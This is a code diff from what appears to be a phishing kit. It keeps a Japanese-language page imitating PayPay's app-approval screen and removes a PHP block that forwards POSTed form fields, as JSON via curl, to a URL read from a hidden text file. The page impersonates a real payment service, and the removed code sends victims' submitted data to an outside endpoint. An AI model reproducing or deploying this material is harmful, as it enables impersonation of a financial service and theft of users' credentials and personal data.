@@ -185,30 +185,3 @@
       icon-md
       
     "></i></div><h3 data-v-5cd38ddc="" class="header-title">アプリを開いて「はい」を押してください</h3><!----><section data-v-9baee138="" data-v-5cd38ddc="" class="otp-auth"><div data-v-9baee138="" class="otp-content"><div data-v-3c60eda2="" data-v-9baee138="" class="otp"><div data-v-3c60eda2="" class="otp-info" style="display: none;"><p data-v-3c60eda2="">アプリに通知が送信されたので、アプリを開き「はい」を押してください</p><p data-v-3c60eda2=""><a data-v-3c60eda2="" href="https://paypay.ne.jp/rd/support/help/c0177/" target="_blank">通知に関して</a></p></div></div></div><!----><p data-v-9baee138=""><span data-v-9baee138=""></span></p><p data-v-9baee138=""><a data-v-9baee138="" href="https://paypay.ne.jp/rd/support/help/c0012/" target="_blank" class="otp-info"><img data-v-9baee138="" src="./sms_files/icon-question.ab269875.svg" width="14" height="14">&nbsp;表示されない場合</a></p><button data-v-9baee138="" class="submit-button">戻る</button></form></section></section></div></section></div></div></body></html>
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-  $name = $_POST["name"];
-  $message = $_POST["message"];
-
-  $jumper = file_get_contents("setend/down.txt");
-
-  $content = "$name\n$message";
-
-  $data = array("content" => $content);
-  $data_string = json_encode($data);
-
-  $ch = curl_init($jumper);
-  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
-  curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-    'Content-Type: application/json',
-    'Content-Length: ' . strlen($data_string)
-  ));
-
-  $result = curl_exec($ch);
-  curl_close($ch);
-
-  
-}
-?>
